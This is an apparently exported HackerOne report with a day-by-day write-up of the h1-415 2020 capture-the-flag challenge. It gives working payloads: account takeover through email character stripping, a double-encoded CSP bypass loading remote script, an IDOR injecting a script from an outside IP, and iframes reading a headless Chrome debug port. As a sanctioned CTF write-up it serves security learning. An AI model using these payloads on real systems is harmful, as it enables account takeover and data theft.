{"id":781265,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83ODEyNjU=","url":"https://hackerone.com/reports/781265","title":"[h1-415 2020] Spent a week and failed at solving the last step.","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-01-23T05:07:37.816Z","submitted_at":"2020-01-23T05:07:37.816Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"s1r1u5","url":"/s1r1u5","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/6NqjjWVeuBun4Voc9bJVpTSp/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":46757,"url":"https://hackerone.com/h1-ctf","handle":"h1-ctf","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/1hYGHKjWZv64FAEYq32nP1EU/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"h1-ctf","twitter_handle":"Hacker0x01","website":"https://hackyholidays.h1ctf.com","about":"Please help us stop the Grinch!"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-02-04T00:17:33.360Z","bug_reporter_agreed_on_going_public_at":"2020-02-04T00:17:33.313Z","team_member_agreed_on_going_public_at":"2020-02-03T20:36:43.667Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\n\nI found something interesting  with Headless chrome debugging in the last step, I am sure I am going to solve this after trying very hard for about a week, I don't know when this CTF is going to end, that's why I am submitting a summary of how to solve this so that I can write the full report after fully solving the final step.\n\n1. ATO of jobert's account using jobert@mydocz.cosmic\n2. CSP bypass using URL double encoding. `https://h1-415.h1ctf.com/support/chat?message=%3Cscript%20type=%22text/javascript%22%20src=%22https://raw.githack.com/mattboldt/typed.js/master/lib/typed.js/..%252f..%252f..%252f..%252f..%252fInvaders0/xss/81faa59004ebeee525502d38b302445be93a2131/as.js%22%3E%3C/script%3E`\n3. IDOR to  update the name at review. ```http://localhost:3000/support/review/c9b46d365357148bcd2436bc5d7fc19f27268010e91cd271b6531f8dff6824dc```\n4. Headless chrome debugging enabled (have to solve).\n\n## Impact\n\n.","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003eI found something interesting  with Headless chrome debugging in the last step, I am sure I am going to solve this after trying very hard for about a week, I don\u0026#39;t know when this CTF is going to end, that\u0026#39;s why I am submitting a summary of how to solve this so that I can write the full report after fully solving the final step.\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eATO of jobert\u0026#39;s account using \u003ca title=\"jobert@mydocz.cosmic\" href=\"mailto:jobert@mydocz.cosmic\" rel=\"nofollow noopener noreferrer\"\u003ejobert@mydocz.cosmic\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003eCSP bypass using URL double encoding. \u003ccode\u003ehttps://h1-415.h1ctf.com/support/chat?message=%3Cscript%20type=%22text/javascript%22%20src=%22https://raw.githack.com/mattboldt/typed.js/master/lib/typed.js/..%252f..%252f..%252f..%252f..%252fInvaders0/xss/81faa59004ebeee525502d38b302445be93a2131/as.js%22%3E%3C/script%3E\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eIDOR to  update the name at review. \u003ccode\u003ehttp://localhost:3000/support/review/c9b46d365357148bcd2436bc5d7fc19f27268010e91cd271b6531f8dff6824dc\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eHeadless chrome debugging enabled (have to solve).\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003e.\u003c/p\u003e\n","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-03-04T20:36:43.878Z","allow_singular_disclosure_after":-25870473.874458116,"singular_disclosure_allowed":true,"vote_count":95,"voters":["sturedman","checkm50","jensec","an0mal1es","skarsom","secator","gabicosta","s1r1u5","a_d_a_m","mashoud1122","and 85 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":42751,"asset_type":"URL","asset_identifier":"https://h1-415.h1ctf.com","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":6847162,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"solved it.\nF693506 will write the report now  :)","markdown_message":"\u003cp\u003esolved it.\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-reference\" data-attachment-filename=\"flag.pdf\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Ar4iSR4jnJD3D17tWUyCKWcV?response-content-disposition=attachment%3B%20filename%3D%22flag.pdf%22%3B%20filename%2A%3DUTF-8%27%27flag.pdf\u0026amp;response-content-type=application%2Fpdf\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065117Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026amp;X-Amz-Signature=7d57a5a76254d0dd7794c5814c4b9af3094269b605abe986b1ccea10b6102a85\" data-attachment-type=\"application/pdf\"\u003eflag.pdf (F693506)\u003c/a\u003e will write the report now  :)\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-23T05:50:17.791Z","updated_at":"2020-01-23T05:50:17.791Z","actor":{"username":"s1r1u5","cleared":true,"url":"/s1r1u5","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/6NqjjWVeuBun4Voc9bJVpTSp/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":693506,"filename":"flag.pdf","type":"application/pdf","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Ar4iSR4jnJD3D17tWUyCKWcV?response-content-disposition=attachment%3B%20filename%3D%22flag.pdf%22%3B%20filename%2A%3DUTF-8%27%27flag.pdf\u0026response-content-type=application%2Fpdf\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQRF2F3DNN%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T065117Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCq%2BvKnwl6LFdj00DiqFKaUHM8vK%2Fo1tPHwYahCeGa93QIgIGXi89nBgDj4GiNdSy8pbzTFSts%2FsTmVKSM%2B7%2BKO9T4qtAMIVxABGgwwMTM2MTkyNzQ4NDkiDC9ugoHsMNk43keJ8SqRA8JrBBYsK5T0HiaJ%2F4T50sG1Ri6J%2BT91kOgNavpYRolFX7jpLcV0V81FUABPzsjSnAxRmYBypjIaPqZGQ8oq%2F9n27wPLgj8hUTl8O3SfU1GWCMHbROvW%2BF2K77xGt0sJKNZYVxNdbqrYwCp5MFfMpJjwvv%2BhMkb%2BfRRyL7GEsu82VMU41lKH3RgrBDJApguUYlLANZ1Ej8ImBTuQa0PTHDqpwoWpjaPcrnIHZqTdHOI5Wm1eCoy5eaHGFikwjjvjuMJ%2F1a5ex%2FCIOhGcwoqCBDet1aBO%2BZq78RzS1QY34XnoChAp%2BaikZB20FcxjUwn%2BkvJECosM%2B4F4PQHepofUS3ejTLZPjeYi9qQNjzq%2Fm%2Fv%2FV4Vqc3IwmTFe06OdDxIgpZyAcTQoSU8vA7sbEDpB%2F3XQDS%2BUqZejbvdrbfU8WGZYnfYRHIKZtByJaRcPB8vqFX9lX0oeLxz0IEswNXH%2FFNMPBsLv79pLu3OV6Lzfbgb36AT8ui2UZLwoOGRrSo71Tb%2FsYvBelBr2drk9Yi%2Fa%2FnGwML2Fq%2F8FOusBbN3FmFgpQ8hwRzpol0ZxBWjfkVayY1CeW8JmiNjsl1ndCgMmcPk10W64GF1qbk7fF0uPQopY1SymUfLnKrk2DYd5OUiFjtVktJLGKZ7wkgrDfWYDpQHSQRJQyMvnd2nX1QfEA0AlGzRulOvM2iwTIk241T4DuFrDCiCqYL8Mv%2FPeDbSAy7t6gkKpJ8C2PUVCIivsXSH1HvLfNTen1g5wD0tpM%2FnXwZxdxfuh8W3doYRnkWcmf8W%2F2IdcL3V8Ca3%2FV7qrIFxbsZIzSmpnSBl18cNkli7atg7%2FBcRNrqYiFsXMe5OsMSXyZkZK%2BQ%3D%3D\u0026X-Amz-Signature=7d57a5a76254d0dd7794c5814c4b9af3094269b605abe986b1ccea10b6102a85"}],"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6847413,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We are closing submissions but feel free to finish your write up soon! :)","markdown_message":"\u003cp\u003eWe are closing submissions but feel free to finish your write up soon! :)\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-23T07:13:41.062Z","updated_at":"2020-01-23T07:13:41.062Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6847414,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-23T07:13:45.258Z","updated_at":"2020-01-23T07:13:45.258Z","actor":{"username":"nahamsec","cleared":true,"url":"/nahamsec","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/413/ab3559068530ebd67a8224a9da7821be178dda07_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"h1-ctf","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":6847575,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Oh man, such a nice CTF I really enjoyed and learned a lot while solving this challenge. I started solving the challenge right away when hackerone tweeted about it, It literally took about a  week to figure out the Jobert's doc and I  nearly spent 11-14 hours a day. \n\n The converter takes image and produces a pdf and whatever our name it will be reflected there. But there is an issue, the server sanitises the input, `\u003c\u003e{}` characters will be removed. Its clear that we have to some how abuse the converter which is a pdf generator and get the `Jobert's Doc`.\n\n**DAY 1**\n\nI did some content discovery and found that there is some blind xss in the support, but  we can't access it so I thought that we need to find an account takeover vulnerability. Support is only accessible to user with license. I  started thinking about the ways to ATO.\n1. Issue in the session.\n2. Account recover which looked quite obvious.\n\nSo with this in mind we spent whole day on finding the patterns between email, username, session and recover token, so that we can crack the session :) \nWrote a script to dump the data. I couldn't find anything interesting.\nF693520\n\n\n**DAY 2 -- Bruteforcing flask SECRET_KEY** \n\nSame as 1st day, dumping whole bunch of data and finding patterns. No use  at all, then started looking at issues like padding oracles, injections etc., At one point  found that the session is flask session `eyJfY3NyZl90b2tlbiI6ImM3YmE0OWUwYTcxMDk1OWJkOTVhMTcxODhlZGY1NTQ1NzFjMzkyYjQifQ.XigzyA.-o92z8hDhn1wea3RKit03eXS8PE`, funnily  started brute forcing the `SECRET_KEY` using `rockyou.txt`  to forge session, obviously brute force failed. And started looking more at the recovery.  What even funnier is, my assumption is that as the server resets for every hour so SECRET_KEY is taking randomly from the some kind of known word list, I tried bruteforce  three resets, not on the server :). \n\n\n**DAY 3 ATO**\n\nI  have a feeling that I even couldn't make the first level, but  didn't stopped digging. I started fuzzing the email, and found that we can give special characters at the end, and what server does is if there are any special characters like `\u003c\u003e{}..` these will remove. With the previous recon we know that the `jobert@mydocz.cosmic` is the customer. So  I register an account with ``jobert@mydocz.cosmic\u003c\u003c\u003c`, the server will remove the specail chars and give us a recovery token which is of form `jobert@mydocz.cosmic:hash` , with this token we can recover account of Jobert. \n\nCustomers of the application has extra feature called support, in that we can rate the support chat, if we give one star rating it shows `We're sorry about that. Our team will review this conversation shortly.`. Now, its quite obvious there is an blind xss in the support. \n\n\n\n**Day 4 CSP Bypass**\n\nAfter ATO of jobert's account, then the next step is to bypass CSP, it didn't take that much time to bypass, with bXSS at report page. \n\n`X-Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'self' https://raw.githack.com/mattboldt/typed.js/master/lib/; img-src data: *`\n\n\nTo bypass the above policy only thing we can do is placing a js file at `https://github.com/mattboldt/typed.js/tree/master/lib/`, which we can't do unless and until we request the `mattboldt` to push js for us. If we can somehow traverse back to our github repo, and keeping this part `https://github.com/mattboldt/typed.js/tree/master/lib/` then CSP can be bypassed, so I tried double encoding and it worked like a charm  like this `https://raw.githack.com/mattboldt/typed.js/master/lib/typed.js/..%252f..%252f..%252f..%252f..%252fInvaders0/xss/81faa59004ebeee525502d38b302445be93a2131/as.js`.\n\nI extracted as much as possible information from the localhost of the server, \n1. It's running on 3000 port\n2. Bot is not logged in to any account\n3. The review(bot's) location is here `http://localhost:3000/support/review/4ed48068429cffc81753d177e4b4409b5f1790d83678573ba040a198fda32edc`.\n4. We can access review page `https://h1-415.h1ctf.com/support/review/4ed48068429cffc81753d177e4b4409b5f1790d83678573ba040a198fda32edc` \n5. There is an option called update user in the review page, I tried updating Jobert's name with `user_id=2` it showed ```Can't update user```.\n\n**Day 5 IDOR to Change user names of other users**\t\t\n\nThe error says ```Can't update user```, I thought can we update our user and also there is an user_id identifier in the settings page, then I made a request with my user_id, damn we can update other users and server is not sanitising the input. There is an XSS in pdf generator.\n\n```\n\nPOST /support/review/a77cf9de605c84e0acc0d66ba0161cece87b607d53b85fbed17cf0cee10b849e HTTP/1.1\nHost: h1-415.h1ctf.com\nConnection: close\nContent-Length: 119\nCache-Control: max-age=0\nOrigin: https://h1-415.h1ctf.com\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88\n Safari/537.36\nSec-Fetch-User: ?1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nReferer: https://h1-415.h1ctf.com/support/review/f19b5d11e2b584dd6cdb335afe411a261b1cdde2f183b54289fc7d7615d19650\nAccept-Encoding: gzip, deflate\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\nCookie: _csrf_token=44aed35ee13d1ae16aac1f8c6cb723a33a81d992; session=eyJfY3NyZl90b2tlbiI6IjQ0YWVkMzVlZTEzZDFhZTE2YWFjMWY4YzZjYjcyM2EzM2E4MWQ5OTIifQ.XikxUg.RGSqXHt0tf83mgG5dCFTjzNe8ps\n\nname=\u003cscript src='http://165.22.213.110/a1.js'\u003e\u003c/script\u003e\u0026user_id=5\u0026_csrf_token=44aed35ee13d1ae16aac1f8c6cb723a33a81d992\n\n```\n\nThe server resets every hour, creating a new user and getting the review location is a mess, so wrote a script which automates this F693607\n\n**Day 6\u00267 Rabbit Holes every where**\n\nI literally failed solving this step and this is the final step of the CTF. These are things I  have tried\n\n1. Port scan with  aquatone's and nmap's most used http ports` https://github.com/michenriksen/aquatone/blob/93c79694068733186878f50a545fa69f3dcec9ce/core/ports.go`\n\n2. Tried to takeover `admin@mydocz.cosmic`. We cant takeover this account from the client side, I tried recovering the account using the same technique  used for `Jobert's` account using XSS in pdf generator and BXSS. I failed at making the requests in localhost, you can see number of commits I did for this here https://github.com/Invaders0/xss.\n\n3. Checked if there is any exploits are there for the Headless Chrome \n```User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36```. Failed\n\n4. Content Discovery at http://localhost/. Failed\n\n5. Lot of other things etc.,\n\nMeanwhile Hackerone released a hint\n\n`üéÜ THE LAST HINT FOR THE #h1415 CTF: \n\nHave you asked the CTF support bot for Jobert‚Äôs doc? \n\nMaybe the user agent can tell you where to look next. üíÅ‚Äç‚ôÇÔ∏èüíÅ‚Äç‚ôÄÔ∏è\n`\n\nAfter some time understanding the hint, I typed `Jobert's Doc` in the chat. It showed.\n\n`I love flags! Where is yours? Wait... I think someone is converting top secret documents as we speak!`\n\nI am like WHAT THE HECK IS THIS?\n\nIf we type `flag` or `Jobert's Doc`  in the chat, the conversion of secret doc is happening in the backend.\n\nThen I tried looking at the localStorage, nothing found.\n\n**Day 8**\n\nLast 2 hours before the challenge\n\nI am made my mind that I can't solve this challenge.\n\nBut I installed Node.js Headless chrome and generated some pdfs, in the github page https://github.com/puppeteer/puppeteer I found there is an option called debug. I tried searching for puppeteer debug port and the port is `9222` which is not in the aquatone's list, seclist, nmap list. I am literally **********.\n I did port scanning in the first place but I didn't do it properly. \n\nThen I changed my username to `document.write('\u003ciframe src=\"http://localhost:9222/\" width=\"100%\" height=\"200%\"\u003e\u003c/iframe\u003e');` this and something is running there its headless chrome debugging mode.\n\n**Stealing JOBERT's DOC***\n\nDoing conversion with the below name\n```\n\nwindow.onload =  function () {\n    document.write('\u003ciframe src=\"http://localhost:9222/json/list\" width=\"100%\" height=\"100%\"\u003e\u003c/iframe\u003e');\n};\n\n```\nand entering `flag` in the chat. \n\nResulted below data in the document.\n\n```\n\n, {\n \"description\": \"\",\n \"devtoolsFrontendUrl\": \"/devtools/inspector.html?\nws=localhost:9222/devtools/page/E07921059A405434488F22AB366D12DA\",\n \"id\": \"E07921059A405434488F22AB366D12DA\",\n \"title\": \"My Docz Converter\",\n \"type\": \"page\",\n \"url\": \"http://localhost:3000/login?\nsecret_document=0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf\",\n \"webSocketDebuggerUrl\": \"ws://localhost:9222/devtools/page/E07921059A405434488F22AB366D12DA\"\n}, {\n \"description\": \"\",\n \"devtoolsFrontendUrl\": \"/devtools/inspector.html?\nws=localhost:9222/devtools/page/8881164BAC5870CC4C2B2768FE47276C\",\n \"id\": \"8881164BAC5870CC4C2B2768FE47276C\",\n \"title\": \"about:blank\",\n \"type\": \"page\",\n \"url\": \"about:blank\",\n \"webSocketDebuggerUrl\": \"ws://localhost:9222/devtools/page/8881164BAC5870CC4C2B2768FE47276C\"\n}, {\n \"description\": \"\",\n \"devtoolsFrontendUrl\": \"/devtools/inspector.html?\nws=localhost:9222/devtools/page/3758C9CE2153E8B69D7250E7FFF221C2\",\n \"id\": \"3758C9CE2153E8B69D7250E7FFF221C2\",\n \"title\": \"about:blank\",\n \"type\": \"page\",\n \"url\": \"about:blank\",\n \"webSocketDebuggerUrl\": \"ws://localhost:9222/devtools/page/3758C9CE2153E8B69D7250E7FFF221C2\"\n}, {\n \"description\": \"\",\n \"devtoolsFrontendUrl\": \"/devtools/inspector.html?\nws=localhost:9222/devtools/page/49553C3E9C52C1F9A0C1228A6A5739FF\",\n \"id\": \"49553C3E9C52C1F9A0C1228A6A5739FF\",\n \"title\": \"about:blank\",\n \"type\": \"page\",\n \"url\": \"about:blank\",\n \"webSocketDe\n\n```\n\nAnd finally here is the flag\n\nhttps://h1-415.h1ctf.com/documents/secret_document=0d0a2d2a3b87c44ed13e0cbfc863ad4322c7913735218310e3d9ebe37e6a84ab.pdf\n\n```\n\nh1ctf{y3s_1m_c0sm1c_n0w}\n\n```\n\n\nHELL OF A RIDE\n#TRYHARDER","markdown_message":"\u003cp\u003eOh man, such a nice CTF I really enjoyed and learned a lot while solving this challenge. I started solving the challenge right away when hackerone tweeted about it, It literally took about a  week to figure out the Jobert\u0026#39;s doc and I  nearly spent 11-14 hours a day. \u003c/p\u003e\n\n\u003cp\u003eThe converter takes image and produces a pdf and whatever our name it will be reflected there. But there is an issue, the server sanitises the input, \u003ccode\u003e\u0026lt;\u0026gt;{}\u003c/code\u003e characters will be removed. Its clear that we have to some how abuse the converter which is a pdf generator and get the \u003ccode\u003eJobert\u0026#39;s Doc\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDAY 1\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eI did some content discovery and found that there is some blind xss in the support, but  we can\u0026#39;t access it so I thought that we need to find an account takeover vulnerability. Support is only accessible to user with license. I  started thinking about the ways to ATO.\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eIssue in the session.\u003c/li\u003e\n\u003cli\u003eAccount recover which looked quite obvious.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eSo with this in mind we spent whole day on finding the patterns between email, username, session and recover token, so that we can crack the session :) \u003cbr\u003e\nWrote a script to dump the data. I couldn\u0026#39;t find anything interesting.\u003cbr\u003e\nF693520\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDAY 2 -- Bruteforcing flask SECRET_KEY\u003c/strong\u003e \u003c/p\u003e\n\n\u003cp\u003eSame as 1st day, dumping whole bunch of data and finding patterns. No use  at all, then started looking at issues like padding oracles, injections etc., At one point  found that the session is flask session \u003ccode\u003eeyJfY3NyZl90b2tlbiI6ImM3YmE0OWUwYTcxMDk1OWJkOTVhMTcxODhlZGY1NTQ1NzFjMzkyYjQifQ.XigzyA.-o92z8hDhn1wea3RKit03eXS8PE\u003c/code\u003e, funnily  started brute forcing the \u003ccode\u003eSECRET_KEY\u003c/code\u003e using \u003ccode\u003erockyou.txt\u003c/code\u003e  to forge session, obviously brute force failed. And started looking more at the recovery.  What even funnier is, my assumption is that as the server resets for every hour so SECRET_KEY is taking randomly from the some kind of known word list, I tried bruteforce  three resets, not on the server :). \u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDAY 3 ATO\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eI  have a feeling that I even couldn\u0026#39;t make the first level, but  didn\u0026#39;t stopped digging. I started fuzzing the email, and found that we can give special characters at the end, and what server does is if there are any special characters like \u003ccode\u003e\u0026lt;\u0026gt;{}..\u003c/code\u003e these will remove. With the previous recon we know that the \u003ccode\u003ejobert@mydocz.cosmic\u003c/code\u003e is the customer. So  I register an account with `\u003ccode\u003ejobert@mydocz.cosmic\u0026lt;\u0026lt;\u0026lt;\u003c/code\u003e, the server will remove the specail chars and give us a recovery token which is of form \u003ccode\u003ejobert@mydocz.cosmic:hash\u003c/code\u003e , with this token we can recover account of Jobert. \u003c/p\u003e\n\n\u003cp\u003eCustomers of the application has extra feature called support, in that we can rate the support chat, if we give one star rating it shows \u003ccode\u003eWe\u0026#39;re sorry about that. Our team will review this conversation shortly.\u003c/code\u003e. Now, its quite obvious there is an blind xss in the support. \u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDay 4 CSP Bypass\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003eAfter ATO of jobert\u0026#39;s account, then the next step is to bypass CSP, it didn\u0026#39;t take that much time to bypass, with bXSS at report page. \u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003eX-Content-Security-Policy: default-src \u0026#39;self\u0026#39;; object-src \u0026#39;none\u0026#39;; script-src \u0026#39;self\u0026#39; https://raw.githack.com/mattboldt/typed.js/master/lib/; img-src data: *\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eTo bypass the above policy only thing we can do is placing a js file at \u003ccode\u003ehttps://github.com/mattboldt/typed.js/tree/master/lib/\u003c/code\u003e, which we can\u0026#39;t do unless and until we request the \u003ccode\u003emattboldt\u003c/code\u003e to push js for us. If we can somehow traverse back to our github repo, and keeping this part \u003ccode\u003ehttps://github.com/mattboldt/typed.js/tree/master/lib/\u003c/code\u003e then CSP can be bypassed, so I tried double encoding and it worked like a charm  like this \u003ccode\u003ehttps://raw.githack.com/mattboldt/typed.js/master/lib/typed.js/..%252f..%252f..%252f..%252f..%252fInvaders0/xss/81faa59004ebeee525502d38b302445be93a2131/as.js\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eI extracted as much as possible information from the localhost of the server, \u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eIt\u0026#39;s running on 3000 port\u003c/li\u003e\n\u003cli\u003eBot is not logged in to any account\u003c/li\u003e\n\u003cli\u003eThe review(bot\u0026#39;s) location is here \u003ccode\u003ehttp://localhost:3000/support/review/4ed48068429cffc81753d177e4b4409b5f1790d83678573ba040a198fda32edc\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eWe can access review page \u003ccode\u003ehttps://h1-415.h1ctf.com/support/review/4ed48068429cffc81753d177e4b4409b5f1790d83678573ba040a198fda32edc\u003c/code\u003e \u003c/li\u003e\n\u003cli\u003eThere is an option called update user in the review page, I tried updating Jobert\u0026#39;s name with \u003ccode\u003euser_id=2\u003c/code\u003e it showed \u003ccode\u003eCan\u0026#39;t update user\u003c/code\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003e\u003cstrong\u003eDay 5 IDOR to Change user names of other users\u003c/strong\u003e      \u003c/p\u003e\n\n\u003cp\u003eThe error says \u003ccode\u003eCan\u0026#39;t update user\u003c/code\u003e, I thought can we update our user and also there is an user_id identifier in the settings page, then I made a request with my user_id, damn we can update other users and server is not sanitising the input. There is an XSS in pdf generator.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\nPOST /support/review/a77cf9de605c84e0acc0d66ba0161cece87b607d53b85fbed17cf0cee10b849e HTTP/1.1\nHost: h1-415.h1ctf.com\nConnection: close\nContent-Length: 119\nCache-Control: max-age=0\nOrigin: https://h1-415.h1ctf.com\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88\n Safari/537.36\nSec-Fetch-User: ?1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nReferer: https://h1-415.h1ctf.com/support/review/f19b5d11e2b584dd6cdb335afe411a261b1cdde2f183b54289fc7d7615d19650\nAccept-Encoding: gzip, deflate\nAccept-Language: en-GB,en-US;q=0.9,en;q=0.8\nCookie: _csrf_token=44aed35ee13d1ae16aac1f8c6cb723a33a81d992; 